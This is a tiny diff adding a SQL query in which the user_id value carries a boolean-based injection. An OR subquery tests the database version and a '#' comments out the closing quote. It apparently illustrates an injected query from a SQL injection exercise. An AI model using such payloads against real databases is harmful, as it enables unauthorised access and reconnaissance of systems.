@@ -1,0 +1,4 @@
+SELECT first_name, last_name
+FROM users
+WHERE user_id = '6' OR (select version() = "5.2.0") # ';
+
